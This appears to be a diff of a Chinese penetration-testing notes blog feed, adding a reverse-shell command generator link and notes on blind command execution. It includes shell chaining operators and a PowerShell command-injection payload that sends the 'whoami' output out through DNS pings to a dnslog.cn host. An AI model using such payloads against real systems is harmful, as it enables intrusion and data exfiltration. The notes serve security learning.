@@ -221,7 +221,8 @@ Imperva SecureSphere&lt;/p&gt;
 &lt;h3&gt;&lt;span id=&#34;反弹-shell&#34;&gt; 反弹 shell&lt;/span&gt;&lt;/h3&gt;
 &lt;ul&gt;
 &lt;li&gt;命令生成工具&lt;br&gt;
-&lt;a href=&#34;https://forum.ywhack.com/bountytips.php?download&#34;&gt; https://forum.ywhack.com/bountytips.php?download&lt;/a&gt;&lt;/li&gt;
+&lt;a href=&#34;https://forum.ywhack.com/bountytips.php?download&#34;&gt; https://forum.ywhack.com/bountytips.php?download&lt;/a&gt;&lt;br&gt;
+ 这个工具可以生成各种系统和环境的文件下载命令（反弹需要 nc，有些服务器没有，这时候需要命令执行下载好后才能继续反弹）&lt;/li&gt;
 &lt;/ul&gt;
 &lt;ol&gt;
 &lt;li&gt;linux 控制 windows&lt;br&gt;
@@ -309,6 +310,18 @@ linux 控制 windows&lt;br&gt;
 （4）对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;命令执行不回显怎么办？&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;
+&lt;li&gt;带外查询&lt;br&gt;
+&lt;a href=&#34;http://t.csdn.cn/PmT4b&#34;&gt; http://t.csdn.cn/PmT4b&lt;/a&gt;&lt;br&gt;
+ 管道符：| (管道符号) ||（逻辑或） &amp;amp;&amp;amp;（逻辑与）  &amp;amp;(后台任务符号)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Windows-&amp;gt;| &amp;amp; || &amp;amp;&amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Linux-&amp;gt;; | || &amp;amp; &amp;amp;&amp;amp; ``(特有``和;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;powershell&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$x=whoami;$x=$x.Replace(&amp;#x27;\&amp;#x27;,&amp;#x27;xxx&amp;#x27;);$y=&amp;#x27;.vpod5d.dnslog.cn&amp;#x27;;$z=$x+$y;ping $z&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;127.0.0.1 | powershell $x=whoami;$x=$x.Replace(&amp;#x27;\&amp;#x27;,&amp;#x27;xxx&amp;#x27;);$y=&amp;#x27;.vpod5d.dnslog.cn&amp;#x27;;$z=$x+$y;ping $z&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 </content>
         <updated>2023-06-27T03:12:30.000Z</updated>
     </entry>
